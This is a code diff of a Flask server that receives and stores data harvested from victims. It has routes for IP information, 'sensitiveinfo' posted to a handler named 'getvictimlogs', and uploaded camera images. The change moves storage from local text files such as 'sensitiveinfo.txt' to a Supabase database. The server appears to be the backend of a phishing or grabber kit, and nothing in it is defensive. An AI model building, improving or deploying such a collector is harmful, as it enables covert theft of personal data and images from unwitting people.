@@ -1,13 +1,17 @@
 from supabase import create_client
 from colorama import Fore, Back, Style
-from flask import Flask, render_template, url_for, request, jsonify,Response
+from flask import Flask, request, jsonify, Response
+from datetime import datetime
 import time
 import os
-if(os.path.exists('image')):
-       print("present")
-else:
-     os.mkdir('image')       
+import logging
+
+# Create image folder if not exists
+if not os.path.exists('image'):
+    os.mkdir('image')
+
 PATH_TO_IMAGES_DIR = 'image'
+
 app = Flask(__name__)
 
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
@@ -15,16 +19,12 @@ SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
 
 supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-
-
-
-import logging
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
 @app.route('/')
 def index():
-   return Response(open('index.html').read(), mimetype="text/html")
+    return Response(open('index.html').read(), mimetype="text/html")
 
 def save_to_db(payload):
     supabase.table("logs").insert({
@@ -32,57 +32,40 @@ def save_to_db(payload):
         "created_at": datetime.utcnow().isoformat()
     }).execute()
 
-
-@app.route('/ipinfo',methods=['POST'])
+@app.route('/ipinfo', methods=['POST'])
 def ipinfos():
-      iplogs = request.get_json()
-      ips = open('ipinfo.txt','a')
-      ips.write("\n")
-      ips.write(str(iplogs))
-      ips.write("\n")
-      ips.close()
-      print(Fore.MAGENTA + "----------------------------------------------------")
-      print("")     
-      print(Fore.RED  + "Ip Logs saved to **ipinfo.txt** ")  
-      print("")
-      print(Fore.MAGENTA + "----------------------------------------------------")
-      print(" ")
-      results = {'processed': 'true'}
-      return jsonify(results) 
+    iplogs = request.get_json()
 
-@app.route('/process_qtc', methods=['POST', 'GET'])
+    save_to_db({
+        "type": "ipinfo",
+        "data": iplogs
+    })
+
+    return jsonify({'processed': 'true'})
+
+@app.route('/process_qtc', methods=['POST'])
 def getvictimlogs():
-  if request.method == "POST":
     logs = request.get_json()
-    log = open('sensitiveinfo.txt','a')
-    log.write("\n")
-    log.write(str(logs))
-    log.write("\n")
-    log.close()
-    
-    
-   
-    print(logs)
-    print("")
-    print(Fore.MAGENTA + "----------------------------------------------------")
-    print("")     
-    print(Fore.RED  + "Victim Logs saved  to **sensitiveinfo.txt**")  
-    print("")
-    print(Fore.MAGENTA + "----------------------------------------------------")
-    
-    results = {'processed': 'true'}
-    return jsonify(results)   
+
+    save_to_db({
+        "type": "sensitiveinfo",
+        "data": logs
+    })
+
+    return jsonify({'processed': 'true'})
+
 @app.route('/image', methods=['POST'])
 def image():
-
-    i = request.files['image']  # get the image
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
+    i = request.files['image']
+    f = '%s.jpeg' % time.strftime("%Y%m%d-%H%M%S")
     i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
-    print(Fore.YELLOW + "Image Saved Successfully")
+
+    save_to_db({
+        "type": "image",
+        "filename": f
+    })
 
     return Response("%s saved" % f)
 
-
 if __name__ == "__main__":
-  app.run(debug=False,host='0.0.0.0',port=8080)
-
+    app.run(debug=False, host='0.0.0.0', port=8080)
